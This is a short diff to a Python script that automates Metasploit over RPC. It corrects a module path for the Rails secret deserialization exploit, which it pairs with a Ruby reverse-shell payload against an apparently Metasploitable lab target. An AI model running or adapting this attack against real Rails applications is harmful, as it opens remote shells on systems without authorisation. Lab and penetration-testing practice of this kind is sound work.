@@ -20,7 +20,7 @@ def main(argv):
 
     client = MsfRpcClient('kali')
 
-    exploit = client.modules.use('exploit', 'use multi/http/rails_secret_deserialization')
+    exploit = client.modules.use('exploit', 'multi/http/rails_secret_deserialization')
     payload = client.modules.use('payload', 'ruby/shell_reverse_tcp')
 
     exploit['COOKIE_NAME'] = "_metasploitable"
